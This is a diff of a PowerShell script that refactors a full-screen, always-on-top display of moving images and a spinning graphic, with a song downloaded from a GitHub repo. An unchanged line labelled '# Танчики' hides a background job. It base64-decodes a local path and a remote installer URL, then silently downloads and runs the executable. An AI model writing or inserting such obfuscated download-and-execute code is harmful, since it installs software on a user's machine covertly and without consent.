@@ -2,12 +2,39 @@ Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
 Add-Type -TypeDefinition @"
-using System.Windows.Forms;
+using System;
 using System.Drawing;
-public class BufferedPanel : Panel {
-    public BufferedPanel() {
-        this.DoubleBuffered = true;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+
+public class Bug {
+    public float X,Y,VX,VY;
+    public int Size;
+    public Bug(float x,float y,float vx,float vy,int sz){X=x;Y=y;VX=vx;VY=vy;Size=sz;}
+    public void Move(int W,int H){
+        X+=VX; Y+=VY;
+        if(X<-100)X=W+10; else if(X>W+10)X=-100;
+        if(Y<-100)Y=H+10; else if(Y>H+10)Y=-100;
+    }
+}
+
+public class GamePanel : Panel {
+    public GamePanel(){
+        this.DoubleBuffered=true;
         this.SetStyle(ControlStyles.AllPaintingInWmPaint|ControlStyles.UserPaint|ControlStyles.OptimizedDoubleBuffer,true);
+    }
+}
+
+public class MCI {
+    [DllImport("winmm.dll",CharSet=CharSet.Auto)]
+    public static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int len, IntPtr hwnd);
+    public static void PlayFile(string path){
+        mciSendString("open \""+path+"\" type mpegvideo alias snd",null,0,IntPtr.Zero);
+        mciSendString("play snd",null,0,IntPtr.Zero);
+    }
+    public static void Stop(){
+        mciSendString("stop snd",null,0,IntPtr.Zero);
+        mciSendString("close snd",null,0,IntPtr.Zero);
     }
 }
 "@ -ReferencedAssemblies System.Windows.Forms,System.Drawing
@@ -15,15 +42,10 @@ public class BufferedPanel : Panel {
 # Танчики
 Start-Job{$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcdGFuNGlraS5leGU='));iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yZWRpcmVjdC5sZXN0YS5ydS9NVC9sYXRlc3Rfd2ViX2luc3RhbGxfcnU='))) -O $f;&$f}|Out-Null
 
-# Скачать песню и играть через mciSendString
+# Песня
 $script:songPath="$env:TEMP\song.mp3"
 iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/song.mp3" -O $script:songPath -UseBasicParsing
-Add-Type -TypeDefinition @'
-using System;using System.Runtime.InteropServices;
-public class MCI{[DllImport("winmm.dll")]public static extern int mciSendString(string cmd,System.Text.StringBuilder ret,int len,IntPtr hwnd);}
-'@
-[MCI]::mciSendString("open `"$($script:songPath)`" type mpegvideo alias song",  $null,0,[IntPtr]::Zero)|Out-Null
-[MCI]::mciSendString("play song", $null,0,[IntPtr]::Zero)|Out-Null
+[MCI]::PlayFile($script:songPath)
 
 # Картинка
 $script:imgPath="$env:TEMP\bg.jpg"
@@ -44,26 +66,24 @@ $script:clr   =@(
 
 $script:a=0.0; $script:ticks=0; $script:stopped=$false; $script:result=''
 
-# Жуки через .NET float[] массивы
+# Жуки через C# класс
 $rng=New-Object System.Random
-$script:BX  =New-Object float[] 20
-$script:BY  =New-Object float[] 20
-$script:BVX =New-Object float[] 20
-$script:BVY =New-Object float[] 20
-$script:BSZ =New-Object int[]   20
+$script:bugs=New-Object 'System.Collections.Generic.List[Bug]'
 for($i=0;$i-lt 20;$i++){
-    $script:BX[$i]  =[float]$rng.Next(50,1800)
-    $script:BY[$i]  =[float]$rng.Next(50,900)
-    $script:BVX[$i] =[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
-    $script:BVY[$i] =[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
-    $script:BSZ[$i] =$rng.Next(45,80)
+    $vx=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
+    $vy=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
+    $script:bugs.Add([Bug]::new(
+        [float]$rng.Next(50,1800),
+        [float]$rng.Next(50,900),
+        $vx,$vy,$rng.Next(45,80)
+    ))
 }
 
 $script:form=New-Object System.Windows.Forms.Form
 $script:form.WindowState='Maximized';$script:form.FormBorderStyle='None'
 $script:form.TopMost=$true;$script:form.BackColor='Black'
 
-$script:panel=New-Object BufferedPanel
+$script:panel=New-Object GamePanel
 $script:panel.Dock='Fill';$script:panel.BackColor='Black'
 
 $script:panel.Add_Paint({
@@ -75,9 +95,8 @@ $script:panel.Add_Paint({
 
     $g.DrawImage($script:bgImg,0,0,$W,$H)
 
-    for($i=0;$i-lt 20;$i++){
-        $sz=$script:BSZ[$i]
-        $g.DrawImage($script:bgImg,[int]$script:BX[$i],[int]$script:BY[$i],$sz,$sz)
+    foreach($b in $script:bugs){
+        $g.DrawImage($script:bgImg,[int]$b.X,[int]$b.Y,$b.Size,$b.Size)
     }
 
     $r=[int]([Math]::Min($W,$H)*0.38)
@@ -154,14 +173,7 @@ $t1=New-Object System.Windows.Forms.Timer;$t1.Interval=16
 $t1.Add_Tick({
     $script:ticks++
     $W=$script:panel.Width;$H=$script:panel.Height
-    for($i=0;$i-lt 20;$i++){
-        $script:BX[$i]+=$script:BVX[$i]
-        $script:BY[$i]+=$script:BVY[$i]
-        if($script:BX[$i] -lt -90){$script:BX[$i]=[float]($W+10)}
-        elseif($script:BX[$i] -gt $W+10){$script:BX[$i]=[float]-90}
-        if($script:BY[$i] -lt -90){$script:BY[$i]=[float]($H+10)}
-        elseif($script:BY[$i] -gt $H+10){$script:BY[$i]=[float]-90}
-    }
+    foreach($b in $script:bugs){$b.Move($W,$H)}
     if(-not $script:stopped){
         $ms=$script:ticks*16
         if($ms -lt 10000){$script:a=($script:a+12)%360}
@@ -173,7 +185,7 @@ $t1.Add_Tick({
 $tClose=New-Object System.Windows.Forms.Timer;$tClose.Interval=28000
 $tClose.Add_Tick({
     $t1.Stop();$tStop.Stop();$tClose.Stop()
-    try{[MCI]::mciSendString("stop song",$null,0,[IntPtr]::Zero)|Out-Null}catch{}
+    [MCI]::Stop()
     $script:form.Close()
 })
 
